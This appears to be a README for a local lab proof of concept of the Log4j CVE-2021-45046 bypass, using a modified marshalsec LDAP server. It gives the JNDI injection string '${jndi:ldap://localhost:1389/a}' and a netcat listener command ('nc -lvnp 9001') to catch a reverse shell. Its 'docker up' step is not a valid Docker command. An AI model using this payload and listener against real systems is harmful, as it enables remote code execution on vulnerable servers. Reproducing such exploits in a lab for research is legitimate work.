# Setup Information

1. `docker build -t cve-45046-server .`
1. `docker up cve-45046-server`

# Changes

Main changes were made to the `LdapRefServer.class` (after compilation) in `marshalsec-0.0.3-SNAPSHOT-all.jar/marshalsec\target\classes\marshalsec\jndi`.

Due to the changes made in Log4j 2.15.0, it introduced a TOCTOU vulnerability. This LDAP server does exactly that.

After running this server and `modified-alpine`, and running a separate netcat listener on port 9001 (this can be done by doing `nc -lvnp 9001`), simply go to `localhost:8080` and provide the string `${jndi:ldap://localhost:1389/a}`.

A shell should be spawned on the netcat listener.